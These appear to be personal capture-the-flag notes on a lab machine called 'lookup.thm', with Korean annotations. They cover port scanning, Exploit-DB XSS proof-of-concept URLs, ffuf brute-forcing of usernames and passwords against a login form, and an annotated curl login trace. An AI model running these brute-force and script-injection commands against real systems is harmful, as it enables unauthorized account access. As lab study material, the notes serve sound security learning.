# 10.10.132.75

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 d5:56:b3:f3:b2:00:86:2d:6d:15:3a:0e:71:7e:c4:8b (RSA)
| 256 7f:3b:7c:3c:91:bb:71:80:a6:8a:21:af:01:94:09:50 (ECDSA)
|\_ 256 3f:b9:54:e9:29:90:97:be:ec:fe:b2:d0:7e:90:c9:ce (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Did not follow redirect to http://lookup.thm
|\_http-server-header: Apache/2.4.41 (Ubuntu)

searchsploit httpd 2.4

---

Exploit Title | Path

---

Apache 2.4.23 mod_http2 - Denial of Service | linux/dos/40909.py
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution | multiple/webapps/50383.sh
Omnicron OmniHTTPd 1.1/2.4 Pro - Remote Buffer Overflow | windows/remote/19566.c
OmniHTTPd 1.1/2.0.x/2.4 - 'test.php' Sample Application Cross-Site | windows/remote/21753.txt
OmniHTTPd 1.1/2.0.x/2.4 - Sample Application URL Encoded Newline H | windows/remote/21757.txt
OmniHTTPd 1.1/2.0.x/2.4 - test.shtml Sample Application Cross-Site | windows/remote/21754.txt
OpenBSD HTTPd < 6.0 - Memory Exhaustion Denial of Service | openbsd/dos/41278.txt

---

──(root㉿docker-desktop)-[/usr/share/exploitdb/exploits/windows/remote]

# cat 21753.txt

source: https://www.securityfocus.com/bid/5568/info

Cross site scripting vulnerabilities have been reported in multiple sample scripts including with OmniHTTPD. In particular, test.shtml and test.php contain errors.

This type of vulnerability may be used to steal cookies or perform other web-based attacks.

http://localhost/test.php?%3CSCRIPT%3Ealert%28document.URL%29%3C%2FSCRIPT%3E=x
┌──(root㉿docker-desktop)-[/usr/share/exploitdb/exploits/windows/remote]
└─#

# cat 21757.txt

source: https://www.securityfocus.com/bid/5572/info

OmniHTTPD is a webserver for Microsoft Windows operating systems. OmniHTTPD supports a number of CGI extensions which provide dynamic content.

A HTML injection vulnerability has been reported in the '/cgi-bin/redir.exe' sample CGI included with OmniHTTPD. Reportedly, it is possible for an attacker to URL encode the newline character (%0D) and insert malicious HTML code. A vulnerable server receiving a malformed request will return a 302 redirect HTTP response containing the malicious attacker-supplied code.

http://localhost/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3CSCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E

curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http%3A%2F%2Fwww%2Eyahoo%2Ecom%2F%0D%0A%0D%0A%3C
SCRIPT%3Ealert%28document%2EURL%29%3C%2FSCRIPT%3E"

http://localhost/cgi-bin/redir.exe?URL=http://www.yahoo.com/

curl -L "http://lookup.thm/cgi-bin/redir.exe?URL=http://www.yahoo.com/"

<SCRIPT>alert(document.URL)</SCRIPT>

# cat 21754.txt

source: https://www.securityfocus.com/bid/5568/info

Cross site scripting vulnerabilities have been reported in multiple sample scripts including with OmniHTTPD. In particular, test.shtml and test.php contain errors.

This type of vulnerability may be used to steal cookies or perform other web-based attacks.

http://localhost/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x
curl -L "http://lookup.thm/test.shtml?%3CSCRIPT%3Ealert(document.URL)%3C%2FSCRIPT%3E=x"

# ffuf

ffuf -w xato-net-10-million-passwords-10000.txt -X POST -u http://lookup.thm/login.php -d 'userna
me=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fs 74

- fw 10 : 응답 본문의 단어 수가 10이면 핕터링
- fs 74 : 응답 사이즈가 74는 필터링

┌──(root㉿codespaces-d5df79)-[/usr/share/seclists/Passwords/Common-Credentials]
└─# ffuf -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=a' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-100000.txt -fs 74 -of /ffuf-passwd.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : POST
:: URL : http://lookup.thm/login.php
:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
:: Data : username=FUZZ&password=a
:: Output file : /ffuf-passwd.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 74

---

admin [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 192ms]
jose [Status: 200, Size: 62, Words: 8, Lines: 1, Duration: 194ms]

# found ids

admin, jose

# ffuf password

[/usr/share/seclists/Passwords/Common-Credentials]
└─# ffuf -u http://lookup.thm/login.php -X POST -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -w 10-million-password-list-top-1000000.txt -fs 62 -o /ffuf.login.passwd.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : POST
:: URL : http://lookup.thm/login.php
:: Wordlist : FUZZ: /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
:: Header : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
:: Data : username=admin&password=FUZZ
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 62

---

password123 [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 191ms]

# login

curl -L -v -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=jose&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'

curl -L -c cookies.txt -X POST http://lookup.thm/login.php -d '{"username": "admin", {"password": "password123"}}' -H "Content-Type: application/json"

# login success

curl -L -v -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=jose&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
Note: Unnecessary use of -X or --request, POST is already inferred.

- Host lookup.thm:80 was resolved.
- IPv6: (none)
- IPv4: 10.10.132.75
- Trying 10.10.132.75:80...
- Connected to lookup.thm (10.10.132.75) port 80
- using HTTP/1.x
  > POST /login.php HTTP/1.1
  > Host: lookup.thm
  > User-Agent: curl/8.14.1
  > Accept: _/_
  > Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  > Content-Length: 34
- upload completely sent off: 34 bytes
  < HTTP/1.1 302 Found
  < Date: Sat, 14 Jun 2025 05:08:03 GMT
  < Server: Apache/2.4.41 (Ubuntu)
- Added cookie login_status="success" for domain lookup.thm, path /, expire 1749881283
  < Set-Cookie: login_status=success; expires=Sat, 14-Jun-2025 06:08:03 GMT; Max-Age=3600; path=/; domain=lookup.thm
- Need to rewind upload for next request
  < Location: http://files.lookup.thm
  < Content-Length: 0
  < Content-Type: text/html; charset=UTF-8
- Ignoring the response-body
- setting size while ignoring
  <
- Connection #0 to host lookup.thm left intact
- Issue another request to this URL: 'http://files.lookup.thm/'
- Stick to POST instead of GET
- Could not resolve host: files.lookup.thm
- shutting down connection #1
  curl: (6) Could not resolve host: files.lookup.thm

# 응답 분석

curl -L -v -c cookies.txt -X POST http://lookup.thm/login.php -d 'username=jose&password=password123' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'

# -L: 리다이렉션 따라감, -v: verbose 모드, -c: 쿠키 저장, -X POST: POST 요청, -d: 로그인 데이터, -H: 헤더 설정

Note: Unnecessary use of -X or --request, POST is already inferred.

# -X POST는 -d 옵션과 함께 이미 POST로 인식되므로 생략 가능

- Host lookup.thm:80 was resolved.

# lookup.thm 도메인이 포트 80으로 해석됨

- IPv6: (none)

# IPv6 주소 없음

- IPv4: 10.10.132.75

# 도메인이 10.10.132.75로 해석됨

- Trying 10.10.132.75:80...

# 해당 IP의 80번 포트에 연결 시도

- Connected to lookup.thm (10.10.132.75) port 80

# 연결 성공

- using HTTP/1.x

# HTTP 1.x 사용

> POST /login.php HTTP/1.1

# login.php에 POST 요청 전송

> Host: lookup.thm

# Host 헤더 설정

> User-Agent: curl/8.14.1

# curl 클라이언트 버전

> Accept: _/_

# Accept 헤더 (_/_ 이 잘못 찍혔을 가능성)

> Content-Type: application/x-www-form-urlencoded; charset=UTF-8

# 폼 전송 형식의 Content-Type

> Content-Length: 34

# 본문 길이 34바이트

- upload completely sent off: 34 bytes

# POST 데이터 전송 완료

< HTTP/1.1 302 Found

# 서버 응답: 로그인 성공 및 리다이렉션 발생

< Date: Sat, 14 Jun 2025 05:08:03 GMT

# 응답 날짜

< Server: Apache/2.4.41 (Ubuntu)

# Apache 서버 정보

- Added cookie login_status="success" for domain lookup.thm, path /, expire 1749881283

# 로그인 성공을 의미하는 쿠키 저장됨

< Set-Cookie: login_status=success; expires=Sat, 14-Jun-2025 06:08:03 GMT; Max-Age=3600; path=/; domain=lookup.thm

# 서버가 로그인 성공 상태 쿠키 설정

- Need to rewind upload for next request

# 다음 요청 처리 준비 중

< Location: http://files.lookup.thm

# 리다이렉션 위치: http://files.lookup.thm

< Content-Length: 0

# 본문 없음

< Content-Type: text/html; charset=UTF-8

# 응답 타입

- Ignoring the response-body

# 본문이 없으므로 무시

- setting size while ignoring

# 내부 처리

<

# 응답 헤더 종료

- Connection #0 to host lookup.thm left intact

# 연결 유지

- Issue another request to this URL: 'http://files.lookup.thm/'

# curl이 리다이렉션을 따라감

- Stick to POST instead of GET

# 원래 방식인 POST 유지

- Could not resolve host: files.lookup.thm

# ❗ DNS에서 files.lookup.thm을 찾지 못함

- shutting down connection #1

# 연결 종료

curl: (6) Could not resolve host: files.lookup.thm

# 🚫 호스트 해석 실패 → /etc/hosts에 도메인 등록 필요

# http://files.lookup.thm
